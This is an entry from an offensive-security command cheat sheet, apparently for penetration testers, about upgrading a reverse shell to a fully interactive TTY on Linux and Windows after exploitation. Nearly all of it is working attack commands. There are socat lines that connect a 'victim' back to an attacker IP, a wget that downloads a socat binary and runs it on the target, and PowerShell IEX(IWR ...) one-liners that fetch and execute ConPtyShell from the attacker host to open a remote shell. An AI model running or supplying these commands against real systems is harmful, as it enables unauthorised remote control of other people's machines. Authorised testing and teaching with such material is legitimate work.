---
description: |
  Stabilize and upgrade a raw reverse shell to a fully interactive TTY with tab completion, arrow keys, and proper terminal handling. Covers Linux (Python, script, socat) and Windows (rlwrap, ConPtyShell) methods.
command: |
  # Linux Full Stabilization Sequence
  # Spawn a PTY with Python3:
  python3 -c 'import pty;pty.spawn("/bin/bash")'

  # Set terminal type and PATH:
  export TERM=xterm
  export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

  # Background the shell and fix terminal (press Ctrl+Z first):
  stty raw -echo; fg

  # Set rows and columns (match your terminal size — check with stty size):
  stty rows 40 cols 160

  # Full stabilization sequence (run in order):
  # 1. In reverse shell:
  python3 -c 'import pty;pty.spawn("/bin/bash")'
  export TERM=xterm
  # 2. Press Ctrl+Z to background the shell
  # 3. In your local terminal:
  stty raw -echo; fg
  # 4. Back in the shell, set rows/cols to match your terminal:
  stty rows 40 cols 160

  # Alternative PTY Spawns
  # If Python3 is not available, use script:
  script /dev/null -c bash

  # Python2 fallback:
  python -c 'import pty;pty.spawn("/bin/bash")'

  # Using /usr/bin/script (no Python needed):
  /usr/bin/script -qc /bin/bash /dev/null

  # Listener with Readline Support
  # Use rlwrap on the listener for arrow keys and history before stabilization:
  rlwrap nc -lvnp 4444

  # Socat Fully Interactive TTY Shell
  # On attacker (listener — requires socat installed):
  socat file:`tty`,raw,echo=0 tcp-listen:4444

  # On victim (connect back — requires socat on target):
  socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.21:4444

  # Transfer socat to target if not installed:
  # On attacker:
  python3 -m http.server 80
  # On victim:
  wget http://10.10.10.21/socat -O /tmp/socat && chmod +x /tmp/socat
  /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.21:4444

  # Windows Shell Stabilization
  # Use rlwrap on listener for basic readline with Windows shells:
  rlwrap nc -lvnp 4444

  # PowerShell stabilization — start PowerShell from cmd shell:
  powershell -ep bypass

  # ConPtyShell — full interactive Windows shell (requires .NET 4.5+):
  # On attacker (listener with stty):
  stty raw -echo; (stty size; cat) | nc -lvnp 4444
  # On victim (PowerShell):
  IEX(IWR http://10.10.10.21/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.10.10.21 4444
  # Or with the exe version:
  .\ConPtyShell.exe 10.10.10.21 4444

  # ConPtyShell with specific dimensions:
  IEX(IWR http://10.10.10.21/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell -RemoteIp 10.10.10.21 -RemotePort 4444 -Rows 40 -Cols 160
items:
  - Shell
phase:
  - Post-Exploitation
target_os:
  - Linux
  - Windows
services: []
techniques: []
references:
  - https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys
  - https://github.com/antonioCoco/ConPtyShell
---
